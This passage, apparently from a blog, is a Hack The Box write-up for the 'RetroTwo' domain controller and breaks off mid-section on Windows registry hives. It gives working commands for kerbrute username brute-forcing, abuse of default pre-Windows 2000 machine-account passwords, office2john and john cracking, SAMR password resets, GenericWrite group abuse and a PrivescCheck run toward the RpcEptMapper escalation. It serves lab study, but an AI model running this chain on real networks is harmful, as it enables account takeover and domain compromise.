        "tags": ["Windows","HTB","Hack The Box","Active Directory","Domain Controller","LDAP","SMB","BloodHound","Pre-Windows 2000","Machine Account","Privilege Escalation","SAMR","LDAPS","GenericWrite","office2john","john","Pentesting","RPC",],
        "content": "RetroTwo Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/RetroTwo How I use variables \u0026amp; Wordlists: Variables:\nIn my commands we are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling we this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if we see me using that path that\u0026rsquo;s why. If we are on Kali and following on, we will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: TCP:\n#Command nmap $box -Pn -oA TCPbasicScan #Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 07:17 BST Nmap scan report for 10.129.5.197 Host is up (0.021s latency). Not shown: 984 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown Initial thoughts: Looks to be a domain controller as we have DNS (53), Kerberos (88), rpc (135), ldap (389, 636) \u0026amp; smb (445). Comprehensive Scans: #Command sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP #Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-19 07:18 BST Nmap scan report for 10.129.5.197 Host is up (0.023s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15F75) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-09-19 06:20:11Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Service |_ssl-date: 2025-09-19T06:21:43+00:00; +1s from scanner time. | rdp-ntlm-info: | Target_Name: RETRO2 | NetBIOS_Domain_Name: RETRO2 | NetBIOS_Computer_Name: BLN01 | DNS_Domain_Name: retro2.vl | DNS_Computer_Name: BLN01.retro2.vl | Product_Version: 6.1.7601 |_ System_Time: 2025-09-19T06:21:03+00:00 | ssl-cert: Subject: commonName=BLN01.retro2.vl | Not valid before: 2025-09-18T06:16:00 |_Not valid after: 2026-03-20T06:16:00 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49166/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%) OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1 Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required | smb2-time: | date: 2025-09-19T06:21:04 |_ start_date: 2025-09-19T06:15:29 | smb-os-discovery: | OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1) | OS CPE: cpe:/o:microsoft:windows_server_2008::sp1 | Computer name: BLN01 | NetBIOS computer name: BLN01\\x00 | Domain name: retro2.vl | Forest name: retro2.vl | FQDN: BLN01.retro2.vl |_ System time: 2025-09-19T08:21:07+02:00 |_clock-skew: mean: -23m58s, deviation: 53m38s, median: 0s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 204.59 seconds Findings: SMB 2 is being used, as well as it\u0026rsquo;s running Windows server 2008 R2 Datacenter. We also have the domain \u0026amp; computer name. | rdp-ntlm-info: | Target_Name: RETRO2 | NetBIOS_Domain_Name: RETRO2 | NetBIOS_Computer_Name: BLN01 | DNS_Domain_Name: retro2.vl | DNS_Computer_Name: BLN01.retro2.vl | Product_Version: 6.1.7601 LDAP 389: Using LDAP anonymous bind to enumerate further: If we are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.\nI actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb It will dump general information \u0026amp; also detailed \u0026amp; simple information including:\nGroups Computers Users All domain objects A file containing all description fields It will also search the domain for any service/svc accounts and place them in a folder too. Let\u0026rsquo;s run it and see what we get back.\npython3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box It turns out the anonymous bind is (+NOT+) enabled and we get the below information.\n------------------------------------------------------------ Connection Attempts ------------------------------------------------------------ • Attempting SSL connection... ✗ Failed to connect with SSL • Attempting non-SSL connection... ⚠️ Connection established but no read access ------------------------------------------------------------ Connection Failed ------------------------------------------------------------ ⚠️ Could not establish LDAP connection • Anonymous bind may be disabled (good security practice) • Credentials may be incorrect • Server may be unreachable • LDAP/LDAPS ports may be filtered We do still get some very valuable information. Here we have the full server name \u0026amp; domain name, we got this from nmap also.\n------------------------------------------------------------ Server Information ------------------------------------------------------------ • IP Address : 10.129.5.197 • Domain Name : retro2.vl • Server Name : BLN01 We also get the domain functionality level.\n• Forest Level: 4 • Domain Level: 4 The functionality level determines the minimum version of Windows server that can be used for a DC.\nKnowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 4 which means that this server has to be running Windows Server 2008 R2 or newer, which tracks with what nmap displayed.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. Any, host OS can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest. https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Updating /etc/hosts \u0026amp; Variables: I have a script I use to update variables in my .zshrc and as we now know the domain and machine values lets store them.\nupdate_var domain \u0026#34;retro2.vl\u0026#34; update_var machine \u0026#34;BLN01\u0026#34; Now, I will update /etc/hosts for DNS and \u0026amp; further LDAP Queries.\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: sudo echo \u0026#34;$box $domain $machine.$domain $machine\u0026#34; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.\nsudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc.\nDNS 53: Let\u0026rsquo;s use dnsenum to find if there are any interesting DNS records being served.\ndnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/combined_subdomains.txt $domain There were no hits for this.\nKerberos 88: Using Kerbrute to bruteforce Usernames: Kerbrute is great for bruteforcing usernames/emails when kerberos is running.\nkerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt -o kerbruteUsers.txt No hits. Using netexec for ASReproasting: We should always try and asreproast with a null/guest session as it can lead to an easy win\nnetexec ldap $box -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --asreproast asrep.txt netexec ldap $box -u guest -p \u0026#39;\u0026#39; --asreproast asrep.txt No hits. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold:\nnetexec smb $box -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares netexec smb $box -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares We can see that we can access the SMB shares as a guest and have READ access to the Public share. Anonymous connection does not work. Enumerating Users with Impacket-lookupsid: Before we enumerate the shares let\u0026rsquo;s use impacket-lookupsid to enumerate users \u0026amp; groups on the domain, well anything that has a SID.\nimpacket-lookupsid guest@\u0026#34;$box\u0026#34; -domain-sids -no-pass \\ | tee \u0026gt;(awk -F\u0026#39;\\\\\\\\| \u0026#39; \u0026#39;/\\(SidTypeUser\\)/{print $3}\u0026#39; | sort -u \u0026gt; sid_users.txt) We get alot of hits back, great! +Note+: I have customized the command to extract usernames and put them in a file called sid_users.txt so we can use them later. As we are using the \u0026ldquo;Guest\u0026rdquo; account we can just hit enter for a blank password Checking Usernames As Passwords: As we have a list of users now let\u0026rsquo;s check if anyone has their username set as their password.\nnetexec smb $box -u users_all.txt -p users_all.txt --shares --no-bruteforce As we can see they do not. Finding Pre-Windows 2000 Computer Accounts On The Domain: Pre-made machine accounts that have had the \u0026ldquo;Assign this computer account as a pre-Windows 2000 computer\u0026rdquo; checkbox checked, but have not been joined to the domain will by default have their name as there password but in lowercase and sans the $ so a computer called ACCOUNTING$ will have the password of accounting. Image Source: Trusted-Sec diving-into-pre-created-computer-accounts As we have computer accounts in our extracted users let\u0026rsquo;s check these to see if these still have default credentials \u0026amp; have not joined the domain.\nnetexec smb $box -u machine_accounts.txt -p machine_passwords.txt --shares --no-bruteforce This is a hit as we got the STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT error on the accounts FSO1$ \u0026amp; FS02$. I have a deep dive into what this error message here STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT however will give a brief overview below.\n+In Simple Terms+: We have found the right machine password, but because the computer hasn\u0026rsquo;t established its domain trust (no Netlogon secure channel / wrong logon path), AD refuses a normal NTLM network logon and returns STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT.\nThis is good as it means we can now request a TGT as these machine accounts or change their passwords.\nThis could be a viable route forward.\nFinding A Microsoft Access Database File In the Public Share: Before we start requesting TGT\u0026rsquo;s let\u0026rsquo;s see what else we can do as the guest user. Lets spider the share for ease and check the results.\nnetexec smb $box -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; -M spider_plus Two folders \u0026amp; 1 file. Lets see if there is anything of note:\ncat /home/kali/.nxc/modules/nxc_spider_plus/$box.json Looks to be a file called staff.accdb within a DB folder. Judging by the name and extension we can infer it\u0026rsquo;s a database file. However let\u0026rsquo;s check just in case. Checking FileInfo.com we can see it\u0026rsquo;s a Microsoft Access 2007 or later database file that should contain tables \u0026amp; fields. Let\u0026rsquo;s download the file to investigate further.\nUsing smbclient To Download The staff.aacdb File: First we can connect with smbclient.\nsmbclient -U \u0026#39;guest\u0026#39; \u0026#34;\\\\\\\\$box\\\\public\u0026#34; Then we can download the file.\ncd DB get staff.accdb Trying To Read The staff.accdb File: I discover online we can read the .accdb file using mdb-tables, so I install the tool suite.\nsudo apt install mdbtools However when trying to read the file we get the below error. It should also be possible to open the file in Visual Studio (not visual studio code) so I open up my Commando VM . However it also has an issue.\nAttempting To Resolve The Error By Modifying The First Byte With DD: As we are receiving the below error when trying to open the file.\nmdb_read_table: Page 2 [size=4096] is not a valid table definition page (First byte = 0xF3, expected 0x02)\nWe can try modifying the first byte from 0xF3 to 0x02 like it wants.\nFirst we create a backup of the file.\ncp staff.accdb staff.accdb.bak Now we modify the first byte using dd:\nprintf \u0026#39;\\x02\u0026#39; | dd of=staff.accdb bs=1 seek=0 count=1 conv=notrunc status=none We can verify this change is correct by comparing our backup of the file with the modified file.\n# show first byte only (hex) xxd -l 1 -p staff.accdb As we can see the byte has changed from 00 to 00 We can try and re-open using mdb-tables but will still get the same problem. Command Breakdown: printf 'x02' → emits a single byte with the value 0x02 to STDOUT. Pipe | → feeds that one byte into dd as its input. dd of=staff.accdb → sets the output file to staff.accdb. bs=1 → sets the block size to 1 byte (so each read/write is exactly one byte). seek=0 → start writing at byte offset 0 (the very first byte). count=1 → write exactly one block (with bs=1, that’s one byte). conv=notrunc → do not truncate the file; only overwrite the target byte. status=none → suppresses dd usual transfer summary for a clean run. 2. Foothold: Requesting Kerberos TGT\u0026rsquo;s As The Computer Accounts: We can use impacket-getTGT to request Kerberos tickets for the computer accounts.\nimpacket-getTGT $domain/FS01\\$:fs01 impacket-getTGT $domain/FS02\\$:fs02 Then we set the ENV KRB5CCNAME to point to the kerberos ticket:\nexport KRB5CCNAME=./FS01\\$.ccache Now we can verify access using netexec\nnetexec smb $domain --use-kcache --shares We should also repeat the process as above for FS02$. Performing a Bloodhound Collection: As we now have valid credentials let\u0026rsquo;s use bloodhound-python to perform a collection.\nbloodhound-python -d $domain -ns $box -u \u0026#39;FS02$\u0026#39; -c All -k -no-pass We then import these into bloodhound for investigation.\nDiscovering A Theoretical Path To RDP On The DC: Looking at the machine accounts we have control over we can see they are part of the \u0026ldquo;DOMAIN COMPUTERS\u0026rdquo; group which has GenericWrite over other hosts in the group. More specifically it grant\u0026rsquo;s us GenericWrite over the machine account ADMWS01 (which I am going to assume is the abbreviated version of \u0026ldquo;Admin Workstation 01\u0026rdquo;. The ADMWS01 account has the AddSelf \u0026amp; AddMember privilege over the \u0026ldquo;SERVICES\u0026rdquo; group. The \u0026ldquo;SERVICES\u0026rdquo; Group is also part of the \u0026ldquo;REMOTE DESKTOP USERS\u0026rdquo; Group. Theoretical Attack Chain: Use FS02/FS01\u0026rsquo;s GenericWrite to modify the password of ADMWS01$. Add an account to the Services Group which has RDP access so we can RDP on to the DC. Now, as I understand it a machine account should not be able to RDP so we would need to control another account……so the hunt begins. What Didn\u0026rsquo;t Work: But you may be thinking? Surely there are other ways to attack this as we have TGT\u0026rsquo;s for two machine accounts? Well let me tell you I tried them and have put them below for full transparency.\nInitially I tried by setting an SPN on the ADMWS01$ account, as we have GenericWrite so I could then request kerberos ticket and then crack the hash. I attempted this with impacket as well as bloody-ad but neither would assign the SPN. I then thought this could be a case of some weird idiosyncratic issue with TGT\u0026rsquo;s from pre-2000\u0026rsquo;s computer accounts but this is not the case.\nI then modified the password of one of the FS0 machines and tried again but it did not let me assign and SPN.\nI then thought the GenericWrite privilege over the ADMWS01 computer account should let us set the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to enable a Resource Based Constrained Delegation Attack (RBCD) however this attribute only exists on Windows Server 2012 or higher.\nYou may be thinking, we can do a shadow credentials attack, however shadow credentials attacks only work on domains with a domain function level of 6 or higher and the domain must have at least one domain controller running Windows Server 2016 or higher. You can read more about shadow credentials attack here .\nSo that means we need access to another account…I believe.\n3. Lateral Movement: Discovering A Service Account Password: So when I am stumped I like to take a look at all the things I have accrued, documents, files etc and re-examine them incase I have missed something. This led me back to staff.accdb.\nDiscovering staff.accdb Is Encrypted: Looking at the staff.accdb file again if we run strings on it and pipe it into head to look at the first 10 lines we can see it is in fact encrypted \u0026amp; this could be why we could not open it.\nstrings staff.accdb | head It turns out we can use office2john to extract the hash for the file and crack it. Using Office2john To Extract The aacdb Hash And Crack It: staff.accdb \u0026gt;\u0026gt; accdb.hash We have our hash. Let\u0026rsquo;s crack the hash:\njohn --wordlist=~/Wordlists/rockwe.txt accdb.hash We get a hit! class08. With any password it\u0026rsquo;s worth doing some credential stuffing but as we can see no hits.\nnetexec smb $box -u Users.txt -p Passwords.txt --shares Opening The accdb File In Microsoft Access: If we try opening it with libre office base the file is listed as corrupted. We can try hitting \u0026ldquo;yes\u0026rdquo; to repair the file but it will not work. Looks like we will need to try and open this using Microsoft office.\nIf we don\u0026rsquo;t have office we can download a trial here .\nOnce we have it, right click \u0026amp; mount the image to then install the programs.\nNow we can double click the file to open it and will be prompted for the password. Discovering LDAP Password In The staff.accdb File. In the file there is not much to look at but if we double click on the \u0026ldquo;staff\u0026rdquo; \u0026ldquo;Module\u0026rdquo; It will then open a microsoft visual basic window where we can see the code for the module.\n+Note+: This part is in German, as my trial ran out when I was trying to get this image (I forgot when writing up) so had to use another vm and downloaded the german language version by mistake.\nIt contains connection credentials for the ldapreader account. Let\u0026rsquo;s validate the credentials.\nnetexec smb $box -u $user -p $pass --shares As we can see they are valid. I credential stuff the password to check for re-use but there is none.\nAnd we are back to square one as this account has the same privileges as the accounts we control…right? Well not quite as we now have a user/service account we control, which means we can move forward with the attack chain outlined before as this required a user/service account we could control so we can RDP.\nRecap — Where We Are Now: We have code-execution / control on the host FS01 and an FS01 machine account ticket (TGT) in FS01$.ccache. Our goal is to change the computer account password for ADMWS01$. In this legacy (Windows Server 2008) domain there are two important things to remember:\nLDAP password resets for machine accounts will often fail in legacy environments unless LDAPS or the Reset Password control is available. (More on this further down.)\nSAMR (RPC via Samba / net rpc) can change machine account passwords if we can successfully authenticate to the remote SMB/SAMR service as an account with the needed rights.\nBecause of these constraints we must change the FS01 machine account password first, then use that working credential/session to change ADMWS01$.\nChanging a Computer Account Password on Legacy AD (2008): On legacy AD domains (2008-era), changing a computer account password requires special consideration. While we need appropriate rights and RPC/SMB access to the domain controller (or machine that accepts SAMR connections), LDAP-based password resets using the unicodePwd attribute often fail without LDAPS or the Reset Password control. This leaves the SAMR/RPC path as our practical option - but there\u0026rsquo;s a catch: we first need valid machine account credentials for one of the FS* accounts (FS01 or FS02). Why we must change FS01\u0026rsquo;s password first While it\u0026rsquo;s important to know what to do, it\u0026rsquo;s far more important to know why we do it.\nThe issue stems from how Kerberos and SMB authentication work together. When FS01 was created with the pre-Windows 2000 (pre-2k) checkbox and left \u0026ldquo;un-onboarded\u0026rdquo; with its default password scheme, a critical mismatch occurs: the Kerberos tickets we generate don\u0026rsquo;t match what AD expects for SMB authentication.\nThe Authentication Chain Problem: Kerberos tickets are tied to the account password. A Kerberos service ticket is encrypted using keys derived from the account\u0026rsquo;s current password in AD. If the account\u0026rsquo;s password used to derive keys locally or in our ticket/ccache doesn\u0026rsquo;t match the password AD expects, the target service (CIFS/SMB) will not accept the ticket for session setup. This yields errors such as NT_STATUS_INVALID_PARAMETER or NT_STATUS_LOGON_FAILURE when trying to open \\\\\u0026lt;host\u0026gt;\\IPC$ and start the SAMR session.\nLDAP-based password resets are often unavailable in legacy setups. On older domains, you can\u0026rsquo;t necessarily reset unicodePwd over plaintext LDAP as the reset requires LDAPS or the Reset Password control. That\u0026rsquo;s why an LDAP reset attempt will often fail even when we have privileges like GenericWrite.\nSAMR (RPC over SMB) can set machine passwords, but only if you can authenticate over SMB. Using net rpc password (Samba in RPC/SAMR mode) succeeds when we have a session to IPC$ authenticated as an account accepted by the target, and that account has the necessary rights. This means to get that session for a machine account, we need the machine\u0026rsquo;s current credential to be valid for SMB authentication.\nThe Solution: Because FS01 still has its pre-2k default password, the Kerberos/SMB authentication context we have won\u0026rsquo;t be accepted by the remote IPC\\(/SAMR service. We must first reset FS01\u0026rsquo;s password to a known value via RPC-SAMR. Once FS01\u0026rsquo;s password is changed and the account keys are in sync between our session and AD, we can authenticate over SAMR and then call net rpc password to change ADMWS01\\).\nExample Of Failed Attempt: Here\u0026rsquo;s what happens when we try to modify ADMWS01$ password without having changed FS01\u0026rsquo;s password first.\nWe have a valid ticket: But we cannot change ADMWS01$ directly using the FS01 ticket when FS01 still has the legacy/default (pre-2k) password. We get the errors:\nNT_STATUS_INVALID_PARAMETER Failed to set password Failed to connect to IPC$ This indicates the SMB session setup failed. A Kerberos TGT alone doesn\u0026rsquo;t guarantee a usable SMB session if the service ticket cannot be generated/used correctly - the service ticket must be encrypted with keys that match what the SMB service expects. Because FS01\u0026rsquo;s keys/password were not in sync, the IPC$/SMB session setup failed, confirming why we must change FS01\u0026rsquo;s password first.\nModifying FS01\u0026rsquo;s Password Using RPC-SAMR We can use impacket-changepasswd for this with the rpc-samr flag, this updates via SAMR not LDAP.\nimpacket-changepasswd $domain/FS01\\$:fs01@$box -newpass StR0ngP@sSw0rd! -p rpc-samr As we can see this succeeded, so now we have usable credentials that SAMBA can present for SMB/SAMR Authentication. As you can see this is successful.\nChanging the ADMWS01$ Password Using SAMR Path (with Samba): Now we can modify the ADMWS01$ password using net rpc.\n# Change the password for the computer account \u0026#39;ADMWS01$\u0026#39; to \u0026#39;MyN3wP@$$w0rd!\u0026#39; net rpc password \u0026#39;ADMWS01$\u0026#39; \u0026#39;MyN3wP@$$w0rd!\u0026#39; \\ -U \u0026#39;retro2.vl/fs01$\u0026#39;%\u0026#39;StR0ngP@sSw0rd!\u0026#39; \\ -S \u0026#39;BLN01.retro2.vl\u0026#39; +Note+: This command uses Samba’s net(8) in RPC mode (SAMR) and not LDAP which means it does *not set unicodePwd directly. That’s why it can succeed where an LDAP would fail on legacy domains without LDAPS or without the Reset Password control as it uses SMB authentication and SAMR.\nAs we can see there is not output so we now need to validate it has worked, it has. Deep Dive Into unicodePwd vs SAMR: On older domains (e.g., Windows Server 2008 functional level), GenericWrite doesn\u0026rsquo;t always give us the modern \u0026ldquo;validated write\u0026rdquo; paths we might expect. In practice, we have two realistic ways to change a computer account\u0026rsquo;s password:\nLDAP unicodePwd set: Requires an encrypted LDAP channel (StartTLS/LDAPS) and the Reset Password control access right. MS-ADTS: unicodePwd specification RPC/SAMR password change: Uses tools like Samba\u0026rsquo;s net rpc password, which bypasses unicodePwd entirely and instead uses SAMR RPC methods. This is particularly useful when LDAPS isn\u0026rsquo;t available on legacy DCs. MS-SAMR: SamrUnicodeChangePasswordUser4 Why 2008 Matters In This Context: Validated writes and newer controls that we rely on in modern forests aren\u0026rsquo;t always usable against 2008-era DCs, especially when:\nLDAPS isn\u0026rsquo;t enabled or is broken (LDAP will refuse unicodePwd modifications without TLS) Your ACE (Access Control Entry) grants GenericWrite on the object but not the Reset Password control access right, blocking password resets via LDAP These constraints push us toward using SAMR (Security Account Manager Remote Protocol) on older systems.\nUnderstanding unicodePwd: unicodePwd is a write-only LDAP attribute used to set an account password. Key characteristics:\nNever returned by search operations Can only be modified over an encrypted LDAP connection (StartTLS or LDAPS) Requires the new password wrapped in double quotes and encoded as UTF-16LE Still subject to domain password policy checks (length/complexity/history) Common Failure Modes:\nNo TLS → Server returns unwillingToPerform Format/policy errors → constraintViolation during modify Insufficient rights → insufficientAccessRights error Note: GenericWrite alone is often insufficient; we need the Reset Password control access right (aka User-Force-Change-Password) The Alternative Route: SAMR (RPC) Password Change Samba\u0026rsquo;s net utility can communicate using RPC/SAMR to perform password changes without touching LDAP at all.\nUnder the hood, this maps to SAMR calls such as SamrUnicodeChangePasswordUser4 . Because this uses RPC over SMB (DCE/RPC), it bypasses the LDAP unicodePwd constraints entirely - no TLS requirement, no LDAP control needed. However, it still requires:\nAppropriate privileges on the target account Network access to SMB/RPC on the DC Valid authentication context (as discussed in the previous section) Choosing Your Attack Path: Use LDAP (unicodePwd) when:\nLDAPS/StartTLS is available and working Your ACE includes the Reset Password control access right Use SAMR when:\nLDAPS is unavailable or broken Your rights don\u0026rsquo;t include Reset Password for LDAP SMB/RPC is reachable and you have valid authentication Troubleshooting Common Issues: unwillingToPerform on LDAP modify: Enable LDAPS or StartTLS constraintViolation: Ensure proper password format (quoted UTF-16LE) and compliance with domain password policy. Access denied on either path: Missing the Reset Password control or equivalent delegated rights. SMB/RPC blocked: Verify SMB/RPC ports are accessible or fall back to LDAP route if available (nmap scan). Adding ldapreader user to the Services Group Using rpc group addmem as ADMWS01$: Now we have control over the ADMWS01$ account we can add ldapreader to the Services group.\n+Note+: Remember we are going to run the following commands in the context of the ADMWS01$ machine account.\nFirst let\u0026rsquo;s verify who is a member of the group\nnet rpc group members \u0026#34;SERVICES\u0026#34; -U $DOMAIN/$user%$pass -S $box As we can see only inventory is part of the group. We will add ldapreader to the group.\nnet rpc group addmem \u0026#34;SERVICES\u0026#34; \u0026#34;LDAPREADER\u0026#34; -U $DOMAIN/$user%$pass -S $box As we can see there is no output again. We can re-run our initial command to verify it worked.\nnet rpc group members \u0026#34;SERVICES\u0026#34; -U $DOMAIN/$user%$pass -S $box It worked! RDPing Onto The DC as ldapreader: Now we can rdp in using the ldapreader account creds we found earlier.\nxfreerdp3 /v:$box /u:$user /p:$pass /d:$domain /drive:/tmp,/home/kali/windowsTools /sec:rdp +clipboard Let\u0026rsquo;s get our flag. 3. Privilege Escalation: Finding a Privesc Path with PrivescCheck: Perfusion: After manually enumerating the box I could not find a clear route forward so I decided to use PrivescCheck to run automated privilege escalation scan.\npowershell -ep bypass -c \u0026#34;. .\\PrivescCheck.ps1; Invoke-PrivescCheck\u0026#34; +Note+: You can either copy the contents of the script to the host by copying and pasting it into a new file or use the shared folder mount we have created with xfreerdp3.\nLooking through the results we can finding two high chances for privesc, DnsCache \u0026amp; RpcEptMapper Searching for an RpcEptMapper exploit we get a hit straight away. https://itm4n.github.io/windows-registry-rpceptmapper-exploit/ How The Perfusion Exploit Works: I would recommend you read itm4n's great blog posts linked below for a complete explanation however as they discovered this 0Day, however I will do my best to explain how this works:\nhttps://itm4n.github.io/windows-registry-rpceptmapper-eop/ https://itm4n.github.io/windows-registry-rpceptmapper-exploit/ If you do not care about how this exploit works jump ahead to Exploiting The RpcEnpMapper Service: but I would recommend you read the how \u0026amp; why this works as it will give you a deeper understand of what is going on here.\nCreating subkeys: Looking at the output of PrivescCheck again we can that listed under the permissions for all domain \u0026ldquo;Users\u0026rdquo; is the ability create subkeys under the existing registry keys for RpcEptMapper \u0026amp; DnsCache: HKLM\\SYSTEM\\CurrentControlSet\\Services\\RpcEptMapper HKLM\\SYSTEM\\CurrentControlSet\\Services\\DnsCache Side Quest: What is a Subkey in Windows Registry? You didn\u0026rsquo;t think you\u0026rsquo;d be able to do this without a little sidequest, did you… If you already have an understanding of subkeys jump ahead to Back To The Exploit: Creating subkeys As Our User: Windows Registry Overview: The Windows Registry is Windows\u0026rsquo; central configuration database. It is effectively a top-down nested key–value store used to read and write system and user-level settings. It contains all the configuration information and settings needed to run any applications and commands on the system.\nThe registry persists on disk in a set of hive files (e.g., SYSTEM, SOFTWARE, SAM, SECURITY, DEFAULT, and per-user NTUSER.DAT) and is loaded into memory when Windows starts. Some parts are volatile and rebuilt on each boot (for example, portions of the current hardware profile) but the registry as a whole is persistent.\nWindows exposes the registry through several predefined root keys (HKLM, HKCU, HKCR, HKU, HKCC). These are root handles/views into the underlying hives; they are not themselves separate files.\nHere is a list of the standard hive files and related registry areas (per Microsoft docs): https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives Registry hive Supporting files HKEY_CURRENT_CONFIG System, System.alt, System.log, System.sav HKEY_CURRENT_USER Ntuser.dat, Ntuser.dat.log HKEY_LOCAL_MACHINE\\SAM Sam, Sam.log, Sam.sav HKEY_LOCAL_MACHINE\\Security Security, Security.log, Security.sav HKEY_LOCAL_MACHINE\\Software Software, Software.log, Software.sav HKEY_LOCAL_MACHINE\\System System, System.alt, System.log, System.sav HKEY_USERS\\.DEFAULT Default, Default.log, Default.sav +Note+: On modern Windows, transaction logs often appear as *.LOG1/*.LOG2. HKEY_CURRENT_CONFIG is a volatile view derived from the SYSTEM hive (it doesn’t have its own standalone hive file).\nBelow are the predefined root keys and what they represent:\nFolder/predefined key Description HKEY_CURRENT_USER Root of configuration for the currently logged-on user. Stores user profile–specific settings (folders, colors, Control Panel options, app prefs). Abbrev: 